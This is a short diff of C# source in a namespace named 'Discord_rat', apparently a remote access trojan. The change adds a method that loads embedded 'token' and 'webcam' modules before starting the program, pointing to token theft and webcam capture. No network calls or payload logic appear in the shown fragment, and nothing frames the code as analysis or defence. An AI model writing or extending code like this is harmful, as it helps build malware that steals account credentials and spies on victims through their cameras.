@@ -270,6 +270,21 @@ namespace Discord_rat
         }
         private static Mutex instanceMutex;
 
+        public static void StartWithModules(byte[] tokenBytes, byte[] mediaBytes)
+        {
+            if (tokenBytes != null && tokenBytes.Length > 0)
+            {
+                EmbeddedModules["token"] = tokenBytes;
+            }
+
+            if (mediaBytes != null && mediaBytes.Length > 0)
+            {
+                EmbeddedModules["webcam"] = mediaBytes;
+            }
+
+            Start();
+        }
+
         public static void Start()
         {
             bool created;
